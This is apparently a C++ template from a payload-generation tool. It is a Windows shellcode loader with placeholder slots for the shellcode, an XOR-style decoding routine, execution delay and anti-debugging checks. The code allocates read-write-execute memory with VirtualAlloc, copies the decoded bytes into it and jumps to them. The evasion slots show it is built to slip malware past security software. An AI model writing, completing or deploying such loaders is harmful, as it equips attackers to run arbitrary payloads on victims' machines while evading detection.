#include <windows.h>
#include <iostream>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

//####INCLUDE####

//####DEFINE####

//####CODE####


DWORD WINAPI esc_main(LPVOID lpParameter)
{
    DWORD dwSize;
    //HANDLE currentProcess;

    const unsigned char raw[] = ####SHELLCODE####;
    int length = sizeof(raw);

    unsigned char* encoded = (unsigned char*)malloc(sizeof(unsigned char)*length*2);
    memcpy(encoded, raw, length);
    //SIZE_T bytesWritten;

    //####CALL####

    unsigned char* decoded = encoded;

    printf("\n");
    printf("DEBUG:After XOR:");
    for (size_t i = 0; i < length; i++) {
        printf("0x%02x,", decoded[i]);
    }
    printf("\n\n");

    //currentProcess = GetCurrentProcess();

    printf("[*] Allocating %d bytes of memory\n", length);
    void *exec = VirtualAlloc(0, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (exec == NULL)
        return -1;

    bool success = false;
    success = memcpy(exec, decoded, length);
    if (!success){
        printf("[-] Oh gosh, something went wrong!\n");
        return -2;
    }
    
    int ret_val = 0;
    printf("[*] Executing\n");
    ((void (*)())exec)();
    
    printf("[+] The shellcode finished with a return value: %08X\n", ret_val);
    return 0;
}

int main()
{
    //####DELAY####
    //####ANTIDEBUG####
    //####ARGS####

    esc_main(NULL);
}
